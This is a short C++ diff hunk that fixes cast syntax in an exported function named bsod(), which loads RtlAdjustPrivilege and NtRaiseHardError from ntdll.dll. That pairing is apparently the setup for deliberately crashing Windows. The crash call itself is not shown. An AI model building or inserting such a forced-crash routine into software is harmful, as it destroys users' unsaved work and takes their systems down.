@@ -495,24 +495,21 @@ DK_API int __stdcall bsod() {
     ULONG uResp;
 
     // Load RtlAdjustPrivilege and NtRaiseHardError functions from ntdll.dll
-    auto RtlAdjustPrivilege = reinterpret_cast<NTSTATUS(WINAPI*>(
-        ULONG,
-        BOOLEAN,
-        BOOLEAN,
-        PBOOLEAN))GetProcAddress(
+    auto RtlAdjustPrivilege = reinterpret_cast<NTSTATUS(WINAPI*)(
+    ULONG, BOOLEAN, BOOLEAN, PBOOLEAN)>(
+        GetProcAddress(
             GetModuleHandleW(L"ntdll.dll"),
             "RtlAdjustPrivilege"
+        )
     );
 
-    auto NtRaiseHardError = reinterpret_cast<NTSTATUS(WINAPI*)>(
-        NTSTATUS,
-        ULONG,
-        ULONG,
-        PULONG_PTR,
-        ULONG,
-        PULONG))GetProcAddress(
+
+    auto NtRaiseHardError = reinterpret_cast<NTSTATUS(WINAPI*)(
+    NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG)>(
+        GetProcAddress(
             GetModuleHandleW(L"ntdll.dll"),
             "NtRaiseHardError"
+        )
     );
 
     if (!RtlAdjustPrivilege || !NtRaiseHardError) {
